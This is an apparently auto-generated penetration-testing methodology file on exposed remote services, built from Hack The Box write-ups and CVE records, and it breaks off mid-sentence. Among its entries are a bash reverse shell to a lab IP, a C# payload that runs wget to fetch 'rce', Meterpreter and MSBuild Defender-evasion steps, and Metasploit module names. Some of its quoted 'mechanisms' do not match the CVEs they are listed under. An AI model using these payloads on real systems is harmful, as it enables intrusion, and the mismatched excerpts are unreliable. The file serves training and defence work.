# Methodology — Exposed Remote Services

> Derived from 29 verified items. Regenerate with `python -m wks.methodgen --class exposed_services --apply`. Do not hand-edit: this file is a projection of the evidence, and edits are lost on the next cycle.

**Surface.** An administrative protocol reachable from where it should not be concedes its authentication surface to that reachability.

**References.** CWE-200

## 1. Preconditions

_Nothing below is reachable until these hold. Confirm each against the target before spending time on the technique._

**Internet-facing building management and CPS devices commonly ship with unmanaged third-party remote access tooling and open network ports, which is the precondition that turns an exposed-services finding into a lateral-movement entry point.**

A hunter should inventory remote-access agents and open ports on non-IT-exposed building systems before anything else, because these are the pivot points into an otherwise segmented network, and should rank an open port as an attack path rather than as a hygiene finding. The precondition framing matters: the exposure itself is ordinary, and the severity comes from what the reachable device trusts once it is spoken to. The claim is falsified by an estate inventory showing no third-party remote access agents and no non-essential open ports on these systems.

- *Disproof:* An inventory showing these CPS environments with no third-party remote access agents and no non-essential open ports would refute the claim for that estate.
- *Evidence:* high_confidence — [claroty.com](https://www.claroty.com/blog/claroty-team82-state-of-cps-security-2025-report-building-management-system-exposures); [labs.watchtowr.com](https://labs.watchtowr.com/here-we-go-again-citrix-netscaler-dtls-preauth-memory-overflow-cve-2026-88772/)

## Reconnaissance signals

_No verified signal items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 2. Test sequence

_Concrete mutations to try. Each is written to be executable, not to be a description of the vulnerability._

**AdmirerToo documents CVE-2021-21311 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine AdmirerToo (official write-up, doc 427, 22872 chars, sha1 3a2f3274284b) describes CVE-2021-21311. Mechanism as documented on the machine: The payload is executed and a reverse shell with root privileges is sent back to our listener on port 7777.

Authoritative record: Adminer is an open-source database management in a single PHP file. In adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected. This is fixed in version 4.7.9.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2021-21311) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/918.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-21311)

**Monitors documents CVE-2020-9496 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Monitors (official write-up, doc 341, 13840 chars, sha1 6a2871c8c951) describes CVE-2020-9496. Mechanism as documented on the machine: Since the version is presented on the login page, we perform some research on Apache OFBiz 17.12.01 and find CVE-2020-9496 which allows us to exploit the vulnerable service through a XML RPC Java deserialization attack. The proof of concept code can be found here. To exploit the vulnerability we need to make a POST request to /webtools/control/xmlrpc and attach a base64 payload to the serializable entity within the XML in the request.

Authoritative record: XML-RPC request are vulnerable to unsafe deserialization and Cross-Site Scripting issues in Apache OFBiz 17.12.03

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-9496) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/502.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-9496)

**Blunder documents CVE-2019-14287 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Blunder (official write-up, doc 254, 14746 chars, sha1 e3891895bdda) describes CVE-2019-14287. Mechanism as documented on the machine: The script reveals that the sudo version is 1.8.25p1 . Researching this specific sudo version, a vulnerability assigned CVE-2019-14287 is identified. This vulnerability allows users to bypass sudo security and escalate their privileges, allows sudo users to run commands as root, even though the configuration explicitly disallows this. The vulnerability exists in sudo versions prior to 1.8.28 . Let's check if we have sudo rights and also verify the sudo version.

Authoritative record: In Sudo before 1.8.28, an attacker with access to a Runas ALL sudoer account can bypass certain policy blacklists and session PAM modules, and can cause incorrect logging, by invoking sudo with a crafted user ID. For example, this allows bypass of !root configuration, and USER= logging, for a "sudo -u \#$((0xffffffff))" command.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-14287) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/755.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-14287)

**Carpediem documents CVE-2022-0492 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Carpediem (official write-up, doc 478, 18394 chars, sha1 509fa75c057c) describes CVE-2022-0492. Mechanism as documented on the machine: We append a reverse shell payload to index.php as follows: cat >> index.php <<'EOF' system("/bin/bash -c 'bash -i &>/dev/tcp/10.10.14.13/7979 0>&1'") EOF

Authoritative record: A vulnerability was found in the Linux kernel's cgroup_release_agent_write in the kernel/cgroup/cgroup-v1.c function. This flaw, under certain circumstances, allows the use of the cgroups v1 release_agent feature to escalate privileges and bypass the namespace isolation unexpectedly.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2022-0492) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/287.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-0492)

**Control documents CVE-2019-11043 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Control (official write-up, doc 218, 10026 chars, sha1 23131759960c) describes CVE-2019-11043. Mechanism as documented on the machine: Let's use the seclogon service. However, our shell is not in an interactive session, and we currently have limited ability to start or otherwise interact with services. The qwinsta command reveals that the user hector is also logged in interactively. We can migrate to an interactive process using Meterpreter. Windows Defender is enabled, and so we can use the signed Windows binary MSBuild.exe to execute a malicious project file such as this one. Download the file and edit it to include the payload generated with msfvenom.

Authoritative record: In PHP versions 7.1.x below 7.1.33, 7.2.x below 7.2.24 and 7.3.x below 7.3.11 in certain configurations of FPM setup it is possible to cause FPM module to write past allocated buffers into the space reserved for FCGI protocol data, thus opening the possibility of remote code execution.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-11043) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/787.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-11043)

**Devzat documents CVE-2019-20933 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Devzat (official write-up, doc 398, 13338 chars, sha1 9232d799c6e0) describes CVE-2019-20933. Mechanism as documented on the machine: Then, we can use Curl to sent a base64 encoded payload in order to avoid possible issues with any bad characters.

Authoritative record: InfluxDB before 1.7.6 has an authentication bypass vulnerability in the authenticate function in services/httpd/handler.go because a JWT token may have an empty SharedSecret (aka shared secret).

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-20933) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/287.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-20933)

**Legacy documents CVE-2008-4250 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Legacy (official write-up, doc 2, 1550 chars, sha1 ce01da9d8e98) describes CVE-2008-4250. Mechanism as documented on the machine: Some searching turns up with CVE-2008-4250, which also has a Metasploit module available for it. Running the module immediately grants a root shell. Note: in some cases the module target must be set for the exploit to work. If so, Windows XP SP3 English is the correct target. Module: exploit/windows/smb/ms08_067_netapi

Authoritative record: The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2, Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary code via a crafted RPC request that triggers the overflow during path canonicalization, as exploited in the wild by Gimmiv.A in October 2008, aka \"Server Service Vulnerability.\"

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2008-4250) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/119.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2008-4250)

**Meta documents CVE-2020-29599 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Meta (official write-up, doc 429, 8404 chars, sha1 0d72c5928ba3) describes CVE-2020-29599. Mechanism as documented on the machine: } This defines a print_info() function that will execute our payload by calling a custom prin . We open a Netcat listener on port 9999:

Authoritative record: ImageMagick before 6.9.11-40 and 7.x before 7.0.10-40 mishandles the -authenticate option, which allows setting a password for password-protected PDF files. The user-controlled password was not properly escaped/sanitized and it was therefore possible to inject additional shell commands via coders/pdf.c.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-29599) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/91.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-29599)

**Passage documents CVE-2019-11447 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Passage (official write-up, doc 275, 13754 chars, sha1 326b8419ab3b) describes CVE-2019-11447. Mechanism as documented on the machine: # Exploit Title: CuteNews 2.1.2 - Remote Code Execution # Google Dork: N/A # Date: 2020-09-10 # Exploit Author: Musyoka Ian # Vendor Homepage: https://cutephp.com/cutenews/downloading.php # Software Link: https://cutephp.com/cutenews/downloading.php # Version: CuteNews 2.1.2 # Tested on: Ubuntu 20.04, CuteNews 2.1.2 # CVE : CVE-2019-11447

Authoritative record: An issue was discovered in CutePHP CuteNews 2.1.2. An attacker can infiltrate the server through the avatar upload process in the profile area via the avatar_file field to index.php?mod=main&opt=personal. There is no effective control of $imgsize in /core/modules/dashboard.php. The header content of a file can be changed and the control can be bypassed for code execution. (An attacker can use the

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-11447) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-11447)

**Remote documents CVE-2019-18988 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Remote (official write-up, doc 234, 8727 chars, sha1 85b05b0a4681) describes CVE-2019-18988. Mechanism as documented on the machine: ... payload = '<?xml version="1.0"?><xsl:stylesheet version="1.0" \ xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:msxsl="urn:schemas-microsoft- com:xslt" \ xmlns:csharp_user="http://csharp.mycompany.com/mynamespace">\ <msxsl:script language="C#" implements-prefix="csharp_user">public string xml() \ { string cmd = "wget 10.10.14.7/rce"; System.Diagnostics.Process proc = new System.Diagnostics.Process();\

Authoritative record: TeamViewer Desktop through 14.7.1965 allows a bypass of remote-login access control because the same key is used for different customers' installations. It used a shared AES key for all installations since at least as far back as v7.0.43148, and used it for at least OptionsPasswordAES in the current version of the product. If an attacker were to know this key, they could decrypt protect informatio

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-18988) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/521.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-18988)

**Shared documents CVE-2022-0543 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Shared (official write-up, doc 483, 13696 chars, sha1 7920b6345a62) describes CVE-2022-0543. Mechanism as documented on the machine: Having confirmed that we can execute code as dan_smith , we can now easily get a reverse shell in the same fashion. We use the following python payload:

Authoritative record: It was discovered, that redis, a persistent key-value database, due to a packaging issue, is prone to a (Debian-specific) Lua sandbox escape, which could result in remote code execution.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2022-0543) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/862.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2022-0543)

**Time documents CVE-2019-12384 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Time (official write-up, doc 286, 6519 chars, sha1 395dcc90656b) describes CVE-2019-12384. Mechanism as documented on the machine: Stand up a Netcat listener on port 4444 and then send the below payload.

Authoritative record: FasterXML jackson-databind 2.x before 2.9.9.1 might allow attackers to have a variety of impacts by leveraging failure to block the logback-core class from polymorphic deserialization. Depending on the classpath content, remote code execution may be possible.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-12384) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/502.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-12384)

**A service exposed on an unexpected port is identified by matching its banner and behaviour to a known product, which is what makes the correct next step discoverable.**

In practice on HTB this shows up as: | **Command** | **Description** |
| ---- | ---- |
| `sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>` | Nmap port scan |
| `mssqlclient.py <user>@<FQDN/IP> -windows-auth` | Log in to the MSSQL server using Windows authentication. |
| `SQL> select name from sys.databases` | Select databases in mssqlclient |

Write-up provenance: ajcriado/htb-writeups :: Academy/CPTS/Content Summary/04. Footprinting.md (1810 words, classified network).

- *Disproof:* Refuted when the service returns no banner and no identifiable protocol behaviour, leaving nothing to match against a known product.
- *Evidence:* high_confidence — [attack.mitre.org](https://attack.mitre.org/tactics/TA0001/); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/200.html); [raw.githubusercontent.com](https://raw.githubusercontent.com/ajcriado/htb-writeups/main/Academy/CPTS/Content%20Summary/04.%20Footprinting.md)

**Ariekei documents CVE-2016-3714 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Ariekei (official write-up, doc 115, 4995 chars, sha1 ba9e6d5e1956) describes CVE-2016-3714. Mechanism as documented on the machine: Exploit: h ttps://imagetragick.com Using the ImageTragick exploit (CVE-2016-3714) is trivial. Uploading an .mvg file with the following content will grant a shell as the first root user.

Authoritative record: The (1) EPHEMERAL, (2) HTTPS, (3) MVG, (4) MSL, (5) TEXT, (6) SHOW, (7) WIN, and (8) PLT coders in ImageMagick before 6.9.3-10 and 7.x before 7.0.1-1 allow remote attackers to execute arbitrary code via shell metacharacters in a crafted image, aka \"ImageTragick.\"

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2016-3714) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/20.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2016-3714)

**Feline documents CVE-2020-9484 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Feline (official write-up, doc 274, 11631 chars, sha1 993afb5872c4) describes CVE-2020-9484. Mechanism as documented on the machine: Let's download the Python exploit script and understand what it's doing.

Authoritative record: When using Apache Tomcat versions 10.0.0-M1 to 10.0.0-M4, 9.0.0.M1 to 9.0.34, 8.5.0 to 8.5.54 and 7.0.0 to 7.0.103 if a) an attacker is able to control the contents and name of a file on the server; and b) the server is configured to use the PersistenceManager with a FileStore; and c) the PersistenceManager is configured with sessionAttributeValueClassNameFilter="null" (the default unless a Securi

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-9484) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/502.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-9484)

**Horizontall documents CVE-2019-18818 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Horizontall (official write-up, doc 374, 11486 chars, sha1 14d40dc1e16e) describes CVE-2019-18818. Mechanism as documented on the machine: # Date: 2021-08-30 # Exploit Author: Musyoka Ian # Vendor Homepage: https://strapi.io/ # Software Link: https://strapi.io/ # Version: Strapi CMS version 3.0.0-beta.17.4 or lower # Tested on: Ubuntu 20.04 # CVE : CVE-2019-18818, CVE-2019-19609

Authoritative record: strapi before 3.0.0-beta.17.5 mishandles password resets within packages/strapi-admin/controllers/Auth.js and packages/strapi-plugin-users-permissions/controllers/Auth.js.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-18818) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/640.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-18818)

**Jewel documents CVE-2020-8165 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Jewel (official write-up, doc 282, 8792 chars, sha1 38a86e3968ec) describes CVE-2020-8165. Mechanism as documented on the machine: apt install rails rails new exploit cd exploit rails console

Authoritative record: A deserialization of untrusted data vulnernerability exists in rails < 5.2.4.3, rails < 6.0.3.1 that can allow an attacker to unmarshal user-provided objects in MemCacheStore and RedisCacheStore potentially resulting in an RCE.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-8165) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/502.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-8165)

**OpenKeyS documents CVE-2019-19520 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine OpenKeyS (official write-up, doc 267, 12867 chars, sha1 e0f2a3b0b307) describes CVE-2019-19520. Mechanism as documented on the machine: Upon login it's confirmed that the version of OpenBSD is 6.6. The blog we discovered earlier also listed two Privilege Escalation vectors for this version of OpenBSD, which might be worth checking out. The CVEs CVE-2019-19520 and CVE-2019-19522 can be used interchangeably, first to escalate to the auth group, and then escalate from there to root .

Authoritative record: xlock in OpenBSD 6.6 allows local users to gain the privileges of the auth group by providing a LIBGL_DRIVERS_PATH environment variable, because xenocara/lib/mesa/src/loader/loader.c mishandles dlopen.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-19520) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/863.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-19520)

**Pit documents CVE-2019-12744 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Pit (official write-up, doc 346, 8960 chars, sha1 36990d7f3d79) describes CVE-2019-12744. Mechanism as documented on the machine: -------------------------------------------------------------------------------- - fix for CVE-2019-12744 (Remote Command Execution through unvalidated

Authoritative record: SeedDMS before 5.1.11 allows Remote Command Execution (RCE) because of unvalidated file upload of PHP scripts, a different vulnerability than CVE-2018-12940.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2019-12744) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/434.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2019-12744)

**Ready documents CVE-2018-19571 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Ready (official write-up, doc 304, 13458 chars, sha1 11ead46fc238) describes CVE-2018-19571. Mechanism as documented on the machine: There are multiple vulnerabilities for Gitlab but we are going to focus on a way to exploit a combination of SSRF (CVE-2018-19571) and CRLF (CVE-2018-19585) vulnerabilities. According to the GitLab Security Release, both vulnerabilities are taking place in this version of Gitlab. The SSRF vulnerability is on the specific version of Redis. We are going to trigger SSRF via importing a new repository by URL. First we create a new project.

Authoritative record: GitLab CE/EE, versions 8.18 up to 11.x before 11.3.11, 11.4 before 11.4.8, and 11.5 before 11.5.1, are vulnerable to an SSRF vulnerability in webhooks.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2018-19571) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/918.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2018-19571)

**RouterSpace documents CVE-2021-3156 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine RouterSpace (official write-up, doc 444, 10456 chars, sha1 cfc55fdbfce4) describes CVE-2021-3156. Mechanism as documented on the machine: The exploit is successful and the root flag can be found in /root .

Authoritative record: Sudo before 1.9.5p2 contains an off-by-one error that can result in a heap-based buffer overflow, which allows privilege escalation to root via \"sudoedit -s\" and a command-line argument that ends with a single backslash character.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2021-3156) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/193.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2021-3156)

**Schooled documents CVE-2020-14321 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Schooled (official write-up, doc 335, 10128 chars, sha1 c1880f5e3bb1) describes CVE-2020-14321. Mechanism as documented on the machine: Another vulnerability affecting Moodle 3.9 (CVE-2020-14321) allows escalation of privileges from the teacher role to the manager role. A PoC exploit for this vulnerability is available on GitHub. A video walkthrough is also available. First we need to grab the ID of the current user (Manuel Phillips). One way to do this is looking at the URL of the profile page linked from the top right menu ( /moodle/user/profile.php?id=24 ). Next, we click the Site home link on the left and then select the Mathematics course. We access the participant list:

Authoritative record: In Moodle before 3.9.1, 3.8.4, 3.7.7 and 3.5.13, teachers of a course were able to assign themselves the manager role within that course.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-14321) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/863.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-14321)

**Tentacle documents CVE-2020-7247 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Tentacle (official write-up, doc 310, 9385 chars, sha1 f401168879ad) describes CVE-2020-7247. Mechanism as documented on the machine: Nmap reveals that port 25 (smtp) is open and OpenSMTPD service is running on this port. A vulnerability (CVE-2020-7247) was discovered in OpenSMTPD 6.6 that allows remote command execution (RCE). Public exploit is available for this vulnerability. We download and modify the exploit to include j.nakazawa@realcorp.htb as a valid email in the recipient address.

Authoritative record: smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2020-7247) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/755.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2020-7247)

**Ypuffy documents CVE-2018-14665 as a route from an authenticated user to elevated privileges, and the authoritative record confirms the same weakness in the affected product.**

HTB machine Ypuffy (official write-up, doc 154, 8241 chars, sha1 351c9e0269c3) describes CVE-2018-14665. Mechanism as documented on the machine: The xorg-x11-server package on the system suffers from a root privilege escalation vulnerability (CVE-2018-14665). This vulnerability was discovered by Narendra Shinde (@nushinde), while the exploit code below was authored by Marco Ivaldi (@0xdea). https://lists.x.org/archives/xorg-announce/2018-October/002927.html https://www.exploit-db.com/exploits/45742

Authoritative record: A flaw was found in xorg-x11-server before 1.20.3. An incorrect permission check for -modulepath and -logfile options when starting Xorg. X server allows unprivileged users with the ability to log in to the system via physical console to escalate their privileges and run arbitrary code under root privileges.

- *Disproof:* Refuted when the running product is outside the affected version range, or when the specific weakness (CVE-2018-14665) is patched on the target: the documented escalation then does not exist, whatever the advisory still says.
- *Evidence:* high_confidence — [cwe.mitre.org](https://cwe.mitre.org/data/definitions/863.html); [services.nvd.nist.gov](https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=CVE-2018-14665)

**An administrative or remote service reachable from where policy forbids it is an initial-access or persistence surface, because attacker leverage is bounded by reachability rather than by the service's own authentication.**

Reachability is the whole variable here. A management interface that is authenticated and patched changes character completely depending on who can reach it, because every control downstream of the listener is unreachable to an adversary who cannot complete a TCP handshake to it. The correct test is therefore not 'is this service exposed' but 'is this service reachable from a segment that policy says should not reach it' — an SMTP relay reachable from the DMZ and the same relay reachable from a laptop are different findings with the same banner. Where the service is required for administration, the mitigation pattern ATT&CK recommends for the comparable WinRM case is the general one: lock down critical enclaves with separate infrastructure and restrict access with host firewall rules to specific destinations, rather than trying to harden a listener that should never have been reachable.

- *Disproof:* If every exposed administrative service is reachable only from an explicitly authorized management segment and enforced at the network layer rather than by application configuration, then the reachability that creates the risk is not present.
- *Evidence:* high_confidence — [attack.mitre.org](https://attack.mitre.org/techniques/T1133/); [talosintelligence.com](https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2291)

**Public writeup evidence for exposed_services: unauthenticated mgmt plane RCE.**

HARVESTED FROM bugbountydaily RSS -> https://blog.silentsignal.eu/2026/06/05/unauthenticated-rce-as-qsecofr-via-ibm-i-management-central/
Reason it matters: unauthenticated mgmt plane RCE.

The combination of a custom binary protocol, client-controlled authentication flags, and a derived usedForAuth field that can be trivially satisfied resulted in unauthenticated root-level command execution.

- *Disproof:* Refuted if the fetched page no longer contains this exact span, or if the described behaviour is corrected or withdrawn by the publisher.
- *Evidence:* high_confidence — [blog.silentsignal.eu](https://blog.silentsignal.eu/2026/06/05/unauthenticated-rce-as-qsecofr-via-ibm-i-management-central/); [cwe.mitre.org](https://cwe.mitre.org/data/definitions/284.html)

## Validation

_No verified validation items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 3. False-positive rejection

_The checks that eliminate the most common non-findings. Run these BEFORE reporting, not after a rejection._

**An SSH service answering on an unusual high TCP port on a consumer or edge device is a vendor port-forward feature, not attacker persistence; the discriminator is whether the port serves the vendor's own management tunnel rather than a general-purpose login.**

The observation that produces this false positive is port 22 absent and SSH present on, for example, TCP 20001, which reads as an operator having moved the shell off the default port to evade detection. Measured across real internet-wide data, SSH appeared on non-standard ports nearly as often as on port 22, so a non-standard port is a population norm rather than an anomaly. A concrete benign instance is a home router whose dropbear SSH service is present and running on port TCP 0.0.0.0:20001 and serves to only allow port forwarding to enable remote cloud connections to the device's configuration service for app-based configuration. That is a vendor cloud-management tunnel: the daemon exists to forward a vendor app session, and it is reachable from the LAN side or the vendor's path by design. The distinguishing test is not the port number but the purpose: does the SSH daemon grant a general interactive shell to an arbitrary source, or does it only relay the vendor management protocol, and is the account/key set constrained to that relay? A high port with a general shell and rotating unknown host keys is a finding; a high port wired to one vendor management endpoint is inventory.

- *Disproof:* The high-port SSH service hands an interactive shell to an unexpected source, or its host key rotates across scans without a firmware change, showing the daemon is being used as an operator foothold rather than as a vendor management tunnel.
- *Evidence:* high_confidence — [helpnetsecurity.com](https://www.helpnetsecurity.com/2026/03/24/detectify-ip-range-scanning/); [talosintelligence.com](https://www.talosintelligence.com/vulnerability_reports/TALOS-2025-2291)

## Known bypasses

_No verified bypass items yet._ Derived from evidence only, so this section is empty rather than plausible.


## 4. Chaining

_How this class escalates when combined with others. Each step is anchored to a promoted item._

**An administrative or remote service reachable from where policy forbids it is initial access rather than a standalone exposure, because the reachable authentication surface is what a relay primitive later supplies with credentials it could not otherwise obtain.**

The exposure and the relay are separate findings that must be reported as one chain or as nothing. The exposure half: an administrative or remote service reachable from a network segment where policy forbids it concedes its authentication surface to that reachability - the control that failed is segmentation, and the consequence is that every authentication mechanism the service offers is now attackable from a position it was never meant to be reached from. The relay half: once such a service answers an outbound or coerced authentication, it hands its own credentials to the party that challenged it, so the exposure converts directly into a credential for the next protocol. The two published halves make this explicit on both sides: Kerberoasting needs only that a low-privileged account and a valid ticket exist to request weakened-encryption service tickets, and it does not matter whether that account actually holds access permissions for those services; separately, forced outbound authentication to an attacker-chosen SMB host returns the server's own NTLM credentials to that host. Compose them and the boundary matters twice - first the attacker needs the service to be reachable at all, and second the relayed credential must land on a service 